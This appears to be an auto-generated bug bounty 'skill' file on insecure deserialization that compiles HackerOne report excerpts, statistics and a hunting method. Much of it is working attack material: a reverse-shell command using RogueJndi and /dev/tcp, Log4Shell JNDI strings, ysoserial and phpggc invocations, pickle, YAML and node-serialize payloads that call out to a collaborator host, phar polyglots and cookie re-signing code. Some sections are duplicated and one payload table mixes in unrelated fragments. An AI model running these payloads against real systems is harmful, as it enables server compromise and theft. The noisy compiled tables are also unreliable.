---
name: bbhunt-deserialization
description: "Use for serialized objects in cookies, tokens, parameters, files or messages where attacker-controlled data reaches a deserializer. Unified from 3 upstream skills (cbh, h1skills, hunting). Plus evidence from all 15,259 disclosed HackerOne reports. For authorized security testing only."
agent_created: true
---

# Insecure Deserialization — unified skill

> **Complete merged skill.** Everything from 3 upstream skills across cbh, h1skills, hunting and the local HackerOne corpus is contained in this file. Unmodified originals remain in `references/` for provenance only.

## Corpus evidence — 69 valid HackerOne reports (20 paid / 29%)

Every disclosed report is valid; payment is an impact signal, not a validity test.

### Techniques ranked across ALL valid reports

| Technique | Reports |
|---|---:|
| deserialization / gadget chain | 34 |
| public source-code / repo review | 25 |
| internal service / port / container | 14 |
| file upload / filename / extension | 11 |
| JWT / token / base64 decode | 8 |
| cache / CDN / unkeyed header | 8 |
| admin / privileged-role context | 8 |
| Content-Type / body-format switch | 6 |
| error message / stack trace probing | 6 |
| third-party data / paste / breach reuse | 6 |
| encoding / double-encode / null byte | 6 |
| HTTP method / verb tampering | 6 |
| subdomain / DNS / cert-transparency recon | 5 |
| race / concurrency / timing | 5 |
| XML / SOAP / SAML / XXE | 5 |
| parser confusion / normalization | 4 |
| WAF / sanitizer / filter bypass | 4 |
| API docs / Swagger / introspection | 3 |
| git history / exposed .git | 3 |
| parameter pollution / duplicate keys | 3 |
| unauthenticated / removed-cookie test | 3 |
| header injection (Host / X-Forwarded / etc.) | 3 |
| two-account / cross-account replay | 2 |
| webhook / OAuth / SAML / integration abuse | 2 |
| OAST / DNS / HTTP callback proof | 2 |
| JS bundle / source-map inspection | 2 |
| second-order / stored / blind delivery | 2 |
|  HosT/absolute-URL reset poisoning | 1 |
| replay / modify a captured request | 1 |
| swap object ID / parameter value | 1 |
| template injection (SSTI) | 1 |

### Parameters observed in writeups

`concept` (3), `mitigation` (3), `dashboard` (3), `keyid` (2), `settings` (2), `location` (2), `enable_xcom_pickling` (2), `context` (1), `res` (1), `publickey` (1), `data` (1), `xuw8gddtvu51x3nmfnmmxiq` (1), `files` (1), `manager` (1), `value` (1), `rowid` (1), `user.provider.url` (1), `usefirstpass` (1), `servicename` (1), `debug` (1), `group.provider.url` (1), `enable_xcom_deserialize_support` (1), `max-age` (1), `hsts` (1), `exit` (1), `chunk` (1)

### Bypass primitives observed

`content-type` (9), `bypass` (3), `bypassing` (2), `type confusion` (1)

### Impact language observed

`rce` (29), `remote code execution` (28), `token` (23), `password` (12), `arbitrary code` (10), `admin` (8), `localhost` (7), `arbitrary file` (6), `privilege escalation` (3), `exfiltrate` (2), `account takeover` (1), `credential` (1)

### Case studies — full excerpts (paid and unpaid)

#### [1529790](https://hackerone.com/reports/1529790) — Kafka Connect RCE via connector SASL  JAAS JndiLoginModule configuration

Aiven Ltd · $5000 · critical

## Summary: When configuring the connector via the Aiven API or the Kafka Connect REST API, the attacker can set the `database.history.producer.sasl.jaas.config` connector property for the `io.debezium.connector.mysql.MySqlConnector` connector. This is likely true for other debezium connectors too. By setting the connector value to `"com.sun.security.auth.module.JndiLoginModule required user.provider.url="ldap://attacker_server" useFirstPass="true" serviceName="x" debug="true" group.provider.url="xxx";"`, the server will connect to the attacker's LDAP server and it deserializes the LDAP response, which the attacker can use to execute java deserialization gadget chains on the kafka connect server. ## Steps To Reproduce: ██████ 1. Login into my VPS: `ssh ███████`, password: `█████` 1. Execute `java -jar RogueJndi-1.1.jar --hostname ███ -c "bash -c bash\${IFS}-i\${IFS}>&/dev/tcp/███/4445<&1"` 1. Execute `nc -nlvp 4445` on another tab 1. Execute `python3 poc.py` on another table. This poc script launches the exploit against my Aiven kafka connect instance. 1. Reverse shell connection should now be established ## The gadget chain The exploit uses `System.setProperty` gadget chain in the scala standard library to enable unsafe deserialization of apache commons collections transformers (finding this gadget chain took way too much time...). This payload has been designed for the Scala 

#### [3031518](https://hackerone.com/reports/3031518) — CVE-2025-24813: Remote Code Execution and/or Information disclosure and/or malicious content added to uploaded files via write enabled Default Servlet

Internet Bug Bounty · $4323 · high

I am sw0rd1ight.I found an Apache Tomcat RCE vulnerability in tomcat 9.0.98. If all of the following were true, a malicious user was able to perform remote code execution: - writes enabled for the default servlet (disabled by default) - support for partial PUT (enabled by default) - application was using Tomcat's file based session persistence with the default storage location - application included a library that may be leveraged in a deserialization attack I reported this vulnerability through the official Apache Tomcat security email and received a fix along with a CVE number CVE-2025-24813. this is screenshot of email and ASF response email I submitted. {F4134453} {F4134456} {F4134458} {F4134462} {F4134464} {F4134466} ## Impact Execute system commands to obtain system permissions

#### [3861550](https://hackerone.com/reports/3861550) — connect.8x8.com: Deserialization Vulnerability  in Automation Builder via Jint→Newtonsoft serializer coercion (TypeNameHandling)

8x8 · $3000 · critical

@kyotozzx reported a deserialization vulnerability in the 8x8 Connect Automation Builder's HTTP request step. The vulnerability occurred when server-side template evaluation exposed Newtonsoft JSON objects directly to the Jint JavaScript engine. By providing a specially crafted JSON response, an authenticated user could coerce Jint's overload resolution to construct a `JsonSerializer` with attacker-controlled `TypeNameHandling` settings, enabling deserialization of arbitrary .NET types including `System.Diagnostics.Process`. The issue was quickly addressed by projecting HTTP responses to plain JavaScript values (`System.Dynamic.ExpandoObject`) before template evaluation, removing all Newtonsoft object exposure from the template scope. We thank @kyotozzx for submitting this report to us.

#### [274990](https://hackerone.com/reports/274990) — Remote code execution on rubygems.org

RubyGems · $1500 · critical

When parsing a gem POSTed to the `/api/v1/gems` endpoint, the rubygems.org application immediately calls `Gem::Package.new(body).spec` inside `app/models/pusher.rb`. The authors of the application correctly observed that parsing untrusted YAML is dangerous (since it can serialize more or less arbitrary objects), so they monkey-patched the spec parser to use `Psych.safe_load` set from `config/initializers/forbidden_yaml.rb`. However, `YAML.load` is called directly when parsing the gem's checksum file in `Gem::Package#read_checksums`. Using classes accessible within the application, I was able to turn this into a call to `Marshal.load` on attacker-controlled data. From there, I was able to use known Marshal exploitation techniques to achieve code execution on the server (I'm omitting some details here for brevity so that I can submit this report right away). A proof of concept, `poc.gem`, is attached. Run the exploit with the following command: `cat poc.gem | curl -H 'Content-Type: application/gzip' --data-binary @- -H 'Authorization: █████' I ran the attached PoC twice. It just does a `wget` to my server. Please let me know if I should clarify anything! Thanks for running this program.

#### [1425474](https://hackerone.com/reports/1425474) — [CVE-2021-44228] nps.acronis.com is vulnerable to the recent log4shell 0-day

Acronis · $1000 · critical

## Summary The website at nps.acronis.com is vulnerable to CVE-2021-44228 ## Steps To Reproduce I used this [script]( to find this. It spins up an interact-sh server to receive the callback and send the payload in the query string and about 30 diffent headers. You can reproduce manually with curl and interact-sh/burp collaborator/a server you control. However, since the callback is proof of the vulnerability, the script makes it easier to identify. Let me know if you want me to tell you which specific header fires the payload and I will test them. 1. Construct the payload: `${jdni:ldap://nps.acronis.com.<your-server>/test}` 1. Inject the payload in the Request Headers (User Agent, X-Forwarded-For etc) or use the script from fullscan: `python3 log4j-scan.py -u ' 1. Observe the callback, proving the deserialization of untrusted data which leads to rce {F1544482} ## Recommendations Update log4j to the latest [version]( If updating to the latest version is not possible the vulnerability can be mitigated by removing the JndiLookup class from the class path. Additionally, the issue can be mitigated on Log4j versions >=2.10 by setting the system property log4j2.formatMsgNoLookups or the LOG4J_FORMAT_MSG_NO_LOOKUPS environment variable to true. ## Impact Remote Code Execution (rce)

#### [396954](https://hackerone.com/reports/396954) — Attacker can add arbitrary data to the blockchain without paying gas

Rootstock Labs · no bounty — still valid · critical

**Summary:** Due to a missing sanity check in Transaction::rlpParse, an attacker can append arbitrary RLP-encoded data to the end of an otherwise valid transaction, and that data will not only pass through validation, but also be propagated throug the network and mined into a block. Since the block parser uses the same code for decoding transactions (as it should), the block will also be conidered valid. **Description:** The issue stems from the Transaction::rlpParse function: Once all the relevant data is pulled from the decoded RLP, there are no checks to ensure that we've reached the end of the data. Since the transaction is constructed using the raw encoded bytes, any future calls to getEncoded() will return the entire byte array, including the bad data at the end. Signature verification of the valid transaction will still pass because it uses getRawEncoded() to compute the signature, which ignores the extra data. ## Steps To Reproduce: On a remote server I start up a regtest node from a clean codebase. This will begin mining as a single-node network: On my local machine, I start another regtest node but I modify the config to a) talk to my remote node, and b) not mine. I don't mine on this node because I will be using it to manufacture beefy transactions and I want to make sure that other, clean nodes will accept/mine these transactions. In addition to the config changes, 

#### [1842674](https://hackerone.com/reports/1842674) — SQL Injection + Insecure Deserialization leads to Remote Code Execution on https://krisp.ai

Krisp · no bounty — still valid · critical

[tenweb-speed-optimizer]( wordpress plugin by [10web.io]( prior to 2.12.22 version was vulnerable to **UNAUTHENTICATED** SQL injection (in `/wp-json/tenwebio/v2/compress-one`) which could be chained with insecure deserialization in the plugin to gain RCE. Vendor published the issue as an "authenticated" one (update: wordfence team corrected it !) - [here]( We would like to thank @mikemyers for reporting it responsibly to us.

### Recurring approach patterns from real reports

- 3× attached is a video detailing the poc generating the payload for generate the payload i used the tool ysoserial
- 2× sending the payload to a vulnerable server curl data binary payload k after sending the payload to the dod server the code was successfully executed and i received the dns query on my bind server as can be seen in the log record below
- 1× when parsing a gem posted to the api v1 gems endpoint the rubygems org application immediately calls gem package new body spec inside app models pusher rb
- 1× however yaml load is called directly when parsing the gem s checksum file in gem package read checksums
- 1× using classes accessible within the application i was able to turn this into a call to marshal load on attacker controlled data
- 1× from there i was able to use known marshal exploitation techniques to achieve code execution on the server i m omitting some details here for brevity so that i can submit this report right away
- 1× in this case as far as i have seen it is used for notifications
- 1× as far as i have seen the deserializer is only used to render notifications in render notifications as seen here the render notifications function is then used on the notifications template page as seen here there is no other place where the deserializer is used as far as i have seen
- 1× in addition to the config changes i have also modified the eth sendtransaction code to add extra rlp encoded bytes to the end of the transaction
- 1× i could have used the eth sendrawtransaction endpoint but i didn t want to go through the process of hand constructing the rlp encoded data impact the attacker can add arbitrary data into the blockchain without paying the requisite gas or undergoing any validation of the extra data
- 1× i have not checked to see how much data can be appended but i assume its limited only by whatever overall block transaction message size constraints exist
- 1× i ve tested with the earliest and latest supported rails version and and both are affected
- 1× we found that insecure deserialization allowed certain java classes in the paypal android app to be accessed by a malicious app on the same device
- 1× i found a deserialization vulnerability in the ownbackup app this vulnerability allows to execute remote code in the server
- 1× description we identified potential unsafe deserialization vulnerability on the endpoint
- 1× hello i found an outdated version of telerik web ui v2016 at the following url this means that we can achieve full rce by chaining two different cves cve which allows us to upload arbitrary files on the server and cve which is a deserialization vulnerability
- 1× first of all the only thing that i tried to prove that i had successfully achieved code execution was making the server sleep for seconds
- 1× things to note i had to edit the original exploit code provided in the aforementioned blog post because i noticed that when uploading the dll file the server added a tmp at the end of the file name
- 1× i added tmp at the end of line and after that it worked just fine
- 1× from here on out i used the write up at for reference
- 1× with a slight modification to the script in the bishopfox write up i was able to determine the software version the versions txt file i used has been attached to this report for ease of replication
- 1× as shown in the results the version is vulnerable to cve and i was able to successfully upload the testfile txt
- 1× to chain gadgets i found nice gadgets to delete some files
- 1× i created it based on geminabox use evil sever impact of course there is a danger in specifying an untrusted source and in the possibility of a man in the middle attack

## Corpus-backed method (this class)

1. Fingerprint the language/framework and identify the serialization format used for state.
2. Locate serialized values the user can influence: cookies, hidden fields, tokens, uploaded files, queue messages.
3. Determine whether integrity is enforced (HMAC/signature) and whether a key is exposed elsewhere.
4. Identify available gadgets for that stack and library versions; use the smallest reliable gadget.
5. Prove a security-relevant effect (command execution, file read, auth flag change) with a callback or bounded observation.

### Signals

- Java `rO0`, PHP `O:`, .NET BinaryFormatter, Ruby Marshal, Python pickle patterns
- Signed-only (not encrypted) object cookies
- Gadget-chain libraries present in the stack

### Kill criteria

- Signed and unforgeable with no key exposure.
- No controllable serialized input reaches a deserializer.
- Gadget requires an unavailable library/version.

### Escalation chains

- Deserialization -> RCE -> internal access.
- Object injection -> auth flag change -> privilege escalation.

### Probes

- rO0 base64 cookies, PHP O: object strings, pickle/protocol markers, Java ViewState.

### Veteran tip

The operator's field notes: identify the language first, then the serialization grammar, then choose the gadget — never blind-fire payloads.

## Unified upstream methodology (complete, deduplicated)

### Discovery and hunting method

### Quick wins

Start here. These are the highest-yield tests for this class.

- Look for serialized blobs: Java, PHP, Python pickle, .NET, Ruby Marshal, YAML.
- Decode cookies/params; identify magic bytes (rO0, a:, 8004, etc.).
- Test gadget chains in an authorized, controlled way.
- Check integrity/signature validation and key management.
- Look at queues, caches, and session stores.

### Deeper checklist

- Look for serialized blobs: Java, PHP, Python pickle, .NET, Ruby Marshal, YAML.
- Decode cookies/params and identify magic bytes and object structure.
- Test gadget chains with ysoserial/phpggc in a safe, authorized manner.
- Check integrity/signature validation and key management.
- Look for deserialization in message queues, caches, and session stores.
- Demonstrate a controlled impact (DNS callback or command execution).

### A. Discovery checklist — concrete places, params, headers, file types to look

- Inventory every value that round-trips through the server and could be a serialized object: session cookies, `rememberMe`, `__VIEWSTATE`, hidden form fields, `state`/`token`/`data`/`job`/`queue`/`cache` params, and any base64-looking blob in a header or JSON body.
- Fingerprint by magic bytes before crafting anything: Java serialized streams start `AC ED 00 05` (hex) / `rO0` (base64); PHP objects look like `O:8:"stdClass":0:{}`; Python pickle starts `\x80\x04` or `\x80\x02`; .NET BinaryFormatter payloads start with `AAEAAAD/////`.
- Check `Content-Type: application/x-java-serialized-object`, `application/octet-stream`, and endpoints under `/remoting/`, `/invoker/`, `/jmx-console/`, `/wls-wsat/`, `/webservices/`.
- Apache Shiro: look for a `rememberMe=` cookie and test with the default AES key before assuming a custom key.
- Log4Shell-style JNDI sinks: test *all* user-controlled fields, not just login — `User-Agent`, `X-Forwarded-For`, `Referer`, `X-Api-Version`, `Accept-Language`, JSON body values, filename/import metadata.
- PHP phar:// surface: any file-upload endpoint plus any later filesystem call on an attacker-influenced path (`file_exists`, `filesize`, `getimagesize`, `is_readable`, `include`) is a candidate — no explicit `unserialize()` in the code required.
- 2025-2026 advisories to pattern-match: OpenMage LTS GHSA-fg79-cr9c-7369 (CVE-2026-25524) — ICO/phar JPEG polyglot uploads reaching `getimagesize()` → RCE; connect.8x8.com (H1, 2026, $3,000) — Jint→Newtonsoft `TypeNameHandling` coercion in an automation builder.
- Source-review greps when you have code: `unserialize(`, `readObject(`, `pickle.loads`, `yaml.load`, `Marshal.load`, `BinaryFormatter`, `TypeNameHandling`, `ObjectInputStream`, `populate({ match:` / sift (Mongoose).
- Backup/source disclosure adjacent to the sink: PortSwigger's custom-chain lab leaks `CustomTemplate.php~` — always try `~`, `.bak`, `.old`, `.orig` on referenced source files.

### Signals and surfaces

### Signal

- Reports: **93** · paid: **27**
- Median bounty **$600** · p90 **$4,500** · max **$10,000** · total **$50,091**
- Median upvotes **16**

### Where it pays

| Program | Reports | Bounty | Upvotes |
|---|---|---|---|
| GitHub Security Lab | 6 | $17,100 | 57 |
| Pornhub | 1 | $10,000 | 271 |
| Internet Bug Bounty | 22 | $8,323 | 217 |
| Aiven Ltd | 1 | $5,000 | 45 |
| 8x8 | 2 | $3,000 | 85 |
| Vanilla | 4 | $2,100 | 120 |
| RubyGems | 2 | $1,500 | 79 |
| Acronis | 1 | $1,000 | 76 |

### Where to look

Parameters, endpoints, and fields that commonly carry this bug:

`cookie` `session` `token` `state` `data` `job` `queue` `cache`

### Crown Jewel Targets

Deserialization bugs are almost always Critical — they lead directly to RCE without prerequisite conditions.

**Highest-value chains:**
- **Java ysoserial gadget chains** — CommonsCollections, Spring, JNDI, Groovy gadgets → full OS command execution
- **PHP Object Injection** — `__wakeup` / `__destruct` magic methods → file write / RCE
- **Python pickle** — `pickle.loads(attacker_data)` → `__reduce__` → `os.system('id')`
- **.NET BinaryFormatter** — TypeConfuseDelegate gadget chain → RCE
- **Ruby Marshal.load** — Gem::Requirement, Gem::Installer gadgets → RCE
- **JNDI injection** — Log4Shell pattern: `${jndi:ldap://attacker/a}` → class load → RCE

---

### Header / Cookie Signals

```
Content-Type: application/x-java-serialized-object
Cookie containing rO0= prefix (Java base64 serialized)
Cookie: rememberMe= (Apache Shiro)
Cookie: _VIEWSTATE (ASP.NET ViewState without encryption)
Endpoints: /remoting/, /invoker/, /jmx-console/, /wls-wsat/
```

---

### Techniques, payloads and bypasses

### Payloads & probes

- Java -> `rO0AB...` + ysoserial gadget
- PHP -> `O:8:"stdClass":...`
- Python -> `cos\nsystem\n(S'id'\ntR.` pickle
- Ruby -> `\x04\b[` Marshal

### Bypass tricks

- Signed cookies with a weak/known key.
- Filter bypass via encoding or nested serialization.
- Use DNS/HTTP callbacks to confirm gadget execution.

### Techniques from real reports

One concrete lesson per report (mined from the writeup), newest and most-upvoted first. Read 5–10 before testing.

- **Attacker can add arbitrary data to the blockchain without paying gas** — `#396954` · Rootstock Labs · $0 · ▲258
  > https://github.com/rsksmart/rskj/blob/master/rskj-core/src/main/java/org/ethereum/core/Transaction.java L242
- **Account takeover via insecure intent handling** — `#2516732` · Basecamp · $0 · ▲136
  > By installing a malicious app on the same device where the Basecamp app is logged in, the attacker could obtain the Oauth2 token of the user logged in and take over his account.
- **SQL Injection + Insecure Deserialization leads to Remote Code Execution on https://krisp.ai** — `#1842674` · Krisp · $0 · ▲119
  > [tenweb-speed-optimizer](https://wordpress.org/plugins/tenweb-speed-optimizer/) wordpress plugin by [10web.io](https://10web.io/), prior to 2.12.22 version was vulnerable to UNAUTHENTICATED SQL injection (in `/wp-json/tenwebio/v2/compress-one`) which could be…
- **Unsafe deserialization leads to token leakage in PayPal & PayPal for Business [Android]** — `#453791` · PayPal · $0 · ▲93
  > https://blog.oversecured.com/Exploiting-memory-corruption-vulnerabilities-on-Android/
- **Authenticated Code Execution through Phar deserialization in CSV Importer as Shop manager in WooCommerce** — `#403083` · Automattic · $0 · ▲84
  > I only displayed the contents of the /etc/passwd file in the PoC video.
- **RCE on Wordpress website** — `#2248328` · Nextcloud · $0 · ▲83
  > https://github.com/nextcloud/nextcloud-theme/blob/e6db0a90391ec94f9eb6d86e16dc16e36c5f4dd4/inc/ninjaforms.php L431
- **Two click Account Takeover** — `#3079738` · Basecamp · $0 · ▲77
  > The vulnerability specifically occurs in the `MainActivity` component when processing deeplinks with URL extras containing specific query parameters.
- **[CVE-2021-44228] nps.acronis.com is vulnerable to the recent log4shell 0-day** — `#1425474` · Acronis · $1,000 · ▲76
  > Construct the payload: `${jdni:ldap://nps.acronis.com.<your-server /test}`
- **GMP Deserialization Type Confusion Vulnerability [MyBB <= 1.8.3 RCE Vulnerability]** — `#198734` · Internet Bug Bounty · $0 · ▲68
  > This means the `$templates` object's handle was set to 5 and stored into objects store, so we can access the `$templates` object and update the `$cache` property via convert GMP object into integer-type ZVAL that value is 5 in during GMP deserialization.
- **insecure deserilize object leads to RCE On Sitecore (CVE-██████████-27218)** — `#3090123` · Mars · $0 · ▲59
  > The vulnerability allows remote code execution (RCE) through unsanitized user input in the ThumbnailsAccessToken header.
- **CVE-2025-24813: Remote Code Execution and/or Information disclosure and/or malicious content added to uploaded files via write enabled Default Servlet** — `#3031518` · Internet Bug Bounty · $4,323 · ▲56
  > - writes enabled for the default servlet (disabled by default)
- **Remote Code Execution through DNN Cookie Deserialization** — `#876708` · U.S. Dept Of Defense · $0 · ▲56
  > You can generate a payload with the following tool https://github.com/pwntester/ysoserial.net, using the DotNetNuke plugin, or use the official exploit from here: https://www.exploit-db.com/exploits/48336, or use the following payload to read a file from the…
- **Unsafe yaml load can lead to remote code execution** — `#2467232` · Liberapay · $0 · ▲55
  > https://github.com/liberapay/liberapay.com/blob/master/liberapay/testing/vcr.py L40
- **Remote code execution on rubygems.org** — `#274990` · RubyGems · $1,500 · ▲51
  > When parsing a gem POSTed to the `/api/v1/gems` endpoint, the rubygems.org application immediately calls `Gem::Package.new(body).spec` inside `app/models/pusher.rb`.
- **connect.8x8.com: Deserialization Vulnerability  in Automation Builder via Jint→Newtonsoft serializer coercion (TypeNameHandling)** — `#3861550` · 8x8 · $3,000 · ▲49
  > By providing a specially crafted JSON response, an authenticated user could coerce Jint's overload resolution to construct a `JsonSerializer` with attacker-controlled `TypeNameHandling` settings, enabling deserialization of arbitrary .NET types including…
- **Java Deserialization RCE via JBoss on card.starbucks.in** — `#221294` · Starbucks · $0 · ▲48
  > The researcher discovered that a Starbucks online system running on the domain `http://card.starbucks.in/` performs deserialization of java objects that are submitted by users on a specific path belonging to JBOSSMQ without sanitizing/validating the data.
- **CVE-2017-9822 DotNetNuke Cookie Deserialization Remote Code Execution (RCE) on lonidoor.mtn.ci** — `#2762119` · MTN Group · $0 · ▲46
  > If everything goes well, following request will return content of win.ini file in response body.
- **Kafka Connect RCE via connector SASL  JAAS JndiLoginModule configuration** — `#1529790` · Aiven Ltd · $5,000 · ▲45
  > Execute `java -jar RogueJndi-1.1.jar --hostname ███ -c "bash -c bash\${IFS}-i\${IFS} &/dev/tcp/███/4445<&1"`
- **Loading YAML in Java client can lead to command execution** — `#1167773` · Kubernetes · $1,000 · ▲45
  > I wrote a small post about this report on my blog, you can find it here: https://j0vsec.com/post/cve-2021-25738/
- **Remote Code Execution via Insecure Deserialization in Telerik UI** — `#838196` · U.S. Dept Of Defense · $0 · ▲45
  > - The `sleep 042020160430,40 amd64.dll` is supposed to Sleep(10).
- **Java Deserialization RCE via JBoss JMXInvokerServlet/EJBInvokerServlet on card.starbucks.in** — `#153026` · Starbucks · $0 · ▲42
  > Invokers: https://card.starbucks.in/invoker/EJBInvokerServlet and https://card.starbucks.in/invoker/JMXInvokerServlet
- **[Switch, PIA/MK8DX] Stack buffer overflow and potential RCE in PIA (LAN/LDN, possibly NEX) room info deserialization** — `#2611669` · Nintendo · $0 · ▲36
  > A vulnerability was discovered in Mario Kart 8 Deluxe's incorrect usage of the [`Pia`](https://github.com/kinnay/NintendoClients/wiki/Pia-Overview) P2P networking library, in which implementations of "`CopyAppData`" (See pseudocode below) are sometimes called…
- **Remote Code Execution on ██.8x8.com via .NET VSTATE Deserialization** — `#1391576` · 8x8 · $0 · ▲36
  > Insert payload into ` VSTATE` parameter on the page.
- **CVE-2023-46132** — `#2255968` · Linux Foundation Decentralized Trust · $0 · ▲34
  > `|$$$$$$$$$$$$| |@@@@@@@@@@@@|%%%%%%%%%|` (The vertical lines " | " represent how transactions are separated in a block.)
- **Navgraph confusion allows any 3p app to send and read requests from the server at app.hey.com** — `#2552879` · Basecamp · $0 · ▲31
  > It is possible to send authenticated requests to the server at app.hey.com and read the server's reply by running a malicious app in the same device as the HEY app.
- **RCE via exposed JMX server on jabber.37signals.com/jabber.basecamp.com** — `#1456063` · Basecamp · $100 · ▲30
  > @ian reported that `jabber.37signals.com` and `jabber.basecamp.com` exposed on port `555` an unauthenticated Java JMX server which was vulnerable to RCE.
- **[HTAF4-213] [Pre-submission] Unsafe AMF deserialization (CVE-2017-5641) in Apache Flex BlazeDS at the https://www.███████/daip/messagebroker/amf** — `#728614` · U.S. Dept Of Defense · $0 · ▲28
  > We identified potential unsafe deserialization vulnerability on the `https://www.█████/daip/messagebroker/amf` endpoint.
- **Bundler's RCE with response using Marshal** — `#1119120` · RubyGems · $0 · ▲28
  > In `GET /api/v1/dependencies`, which Bundler uses to check dependencies, the response is `Marshal.dump` instead of `JSON`.
- **Arbitrary File delete via PHAR deserialization** — `#921288` · Concrete CMS · $0 · ▲28
  > With the parameter of filesystem function (`file exists()`, `is dir()`, etc.) under control, this method can be used with `phar://` pseudo-protocol to directly perform deserialization without relying on `unserialize()`[2].
- **Remote Code Execution via Insecure Deserialization in Telerik UI (CVE-2019-18935)** — `#1174185` · U.S. Dept Of Defense · $0 · ▲27
  > This uploads a file (in this case, `testfile.txt`) to the `█████` directory on the target server.

### Payload fragments observed

Recurring payloads from this class's writeups. Adapt, don't paste blindly.

| Seen | Fragment |
|---:|---|
| 3× | `$templates` |
| 3× | `__proto__` |
| 2× | `$cache` |
| 2× | `curl -v \ / --proxy https://127.0.0.1:18443 --proxy-insecure \ / --hsts ./hsts-cache.txt \ / http://hsts-probe.test:18080/` |
| 2× | `cf_ssl_is_alive()` |
| 1× | `system('id')` |
| 1× | `$_COOKIE['nc_form_fields']` |
| 1× | `${jdni:ldap://nps.acronis.com.<your-server>/test}` |
| 1× | `ZEND_API HashTable *zend_std_get_properties(zval *object TSRMLS_DC) /* {{{ */ / { / zend_object *zobj; / zobj = Z_OBJ_P(object); / if (!zobj` |
| 1× | `curl --cookie 'mybb[forumread]=a:1:{i:0%3bC:3:"GMP":106:{s:1:"5"%3ba:2:{s:5:"cache"%3ba:1:{s:5:"index"%3bs:14:"{${phpinfo()}}"%3b}i:0%3bO:12` |
| 1× | `Gem::Package.new(body).spec` |
| 1× | `PS C:\>ysoserial.net\ysoserial\bin\Release\ysoserial.exe -p DotNetNuke -m read_file -f C:\Windows\win.ini` |
| 1× | `java -jar RogueJndi-1.1.jar --hostname ███ -c "bash -c bash\${IFS}-i\${IFS}>&/dev/tcp/███/4445<&1` |
| 1× | `\\| Packet type (` |
| 1× | `\\|$$$$$$$$$$$$\\|*************\\|@@@@@@@@@@@@\\|%%%%%%%%%\\|` |
| 1× | `$$$$$$$$$$$$*************@@@@@@@@@@@@%%%%%%%%%` |
| 1× | `\\|$$$$$$$$$$$$*************\\|@@@@@@@@@@@@\\|%%%%%%%%%\\|` |
| 1× | `POST /daip/messagebroker/amf HTTP/1.1 / Host: www.███████ / Connection: close / Accept-Encoding: gzip, deflate / Accept: */* / User-Agent: p` |
| 1× | `script.py <collaborator> 80` |
| 1× | `❯ RUBYGEMS_PROXY=true rackup / Puma starting in single mode... / * Puma version: 5.2.2 (ruby 2.7.1-p83) ("Fettisdagsbulle") / * Min threads:` |

### B. Techniques & bypasses — specific actionable techniques/payload shapes

- Universal Java detection chains first, before any library-specific guess: `URLDNS` triggers a DNS lookup for a supplied URL and works on any Java version with no vulnerable dependency; `JRMPClient` forces a TCP connection (use a raw IP). For firewalled egress, send one payload with a local IP (instant response) and one with a blocked external IP (hang) — the timing delta proves deserialization in blind cases.
- Java 16+ ysoserial invocation needs `--add-opens` flags (e.g. `java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED`, `java.base/java.util=ALL-UNNAMED`); older one-liners silently fail.
- Modern Java reality check: JDK 16+ strong module encapsulation breaks most classic CommonsBeanutils chains; GadgetBuilder (Nordsec 2025) reactivated 85% of ysoserial payloads and added 29 main chains, with sink adapters such as `FileOutputStream` (file write) and `URL.getContent()` (SSRF/NTLM reflection).
- Property/type tampering before gadget hunting: flip `isAdmin` `b:0`→`b:1` in a PHP session object; exploit PHP loose comparisons by supplying integer `0` where a string password is expected (`0 == "Example string"` is true on PHP 7.x, false on PHP 8+, but `5 == "5 of something"` remains true). Remember to update all type labels and length indicators.
- PHPGGC workflow: `./phpggc -l` to list chains, `phpggc Symfony/RCE4 exec 'id' | base64`, then re-sign the cookie. PortSwigger's pre-built-chain lab leaks `SECRET_KEY` via `/cgi-bin/phpinfo.php` and rebuilds the cookie as `urlencode('{"token":"'.$object.'","sig_hmac_sha1":"'.hash_hmac('sha1',$object,$secretKey).'"}')`.
- PHP fast-destruct mode (`phpggc -f`) matters when the sink errors and rolls back before `__destruct` — without it the trigger never fires.
- Custom PHP chain pattern from the PortSwigger lab: chain `__wakeup()` → `Product` constructor → `DefaultMap::__get()` → `call_user_func($callback, $name)` to reach `exec`.
- Python pickle: `__reduce__` returning `(os.system, ('curl http://COLLAB/pickle',))`; `yaml.load` pre-5.1: `!!python/object/apply:os.system ['curl http://COLLAB/yaml']`; Node `node-serialize`: `_$$ND_FUNC$$_function(){require('child_process').exec(...)}()`.
- phar:// polyglot: `phpggc -p phar -o poly.jpg Monolog/RCE1 system id` prepends a valid JPEG/GIF header so image validation passes, then reach `phar://uploads/poly.jpg/x` through any filesystem function — PHP ignores the extension when reading a stream.
- .NET: YSoSerial.Net `-f BinaryFormatter -g TypeConfuseDelegate`; on SharePoint, chain anonymous XXE in `_vti_bin/*.asmx` → `web.config` → `<machineKey>` → ViewState deserialization RCE.

### Validation and proof

### Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.

### Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.

---

<!-- ============ PART 2: BUG HUNTER METHODOLOGY (execution + validation) ============ -->

# HUNT-DESERIALIZATION — Insecure Deserialization

### Validation

✅ DNS/HTTP callback from COLLAB host: blind deserialization confirmed
✅ Command output in response: full RCE confirmed

**Severity:** Almost always **Critical** — RCE with server process privileges.

---

### C. Validation / proof bar — how to confirm and avoid false positives

- A DNS/HTTP callback from `URLDNS` or an OOB gadget proves *deserialization occurred* — it does not prove RCE. Escalate to a command output or a callback emitted from inside the executed command before claiming Critical.
- An exception change after tampering is only a lead; it can be a length/type validation error. Confirm with a universal detection chain.
- For signed cookies, a modified cookie that returns a signature error means the signing check is active — recover the key (debug endpoint, source disclosure, default key) before claiming anything.
- Validate the whole chain end-to-end: payload generated → encoded correctly (base64 + URL-encode where required) → accepted → magic method fired → sink reached. A generation tool succeeding is not evidence the target is vulnerable.
- Blind timing detection (JRMPClient local vs firewalled IP) must be repeated at least 3× with stable deltas; a single slow response is noise.
- When a chain fails, distinguish "wrong library/version" from "no deserialization" by re-testing with `URLDNS` — if that also fails, the entry point is not a deserialization sink.
- Severity: deserialization reaching `id`/OOB command execution is almost always Critical; object-type injection with only a privilege/cookie-state change is High; detection-only callback is Medium and should be described as confirmed deserialization, not RCE.

**Language-specific sink checklist (verify each before moving on):**
- Java: `ObjectInputStream.readObject()`, `readResolve()`, `readObjectNoData()`, XMLDecoder, XStream, Kryo, Hessian, Jackson polymorphic typing (`@class` / `defaultTyping`), SnakeYAML `Constructor` (CVE-2022-1471).
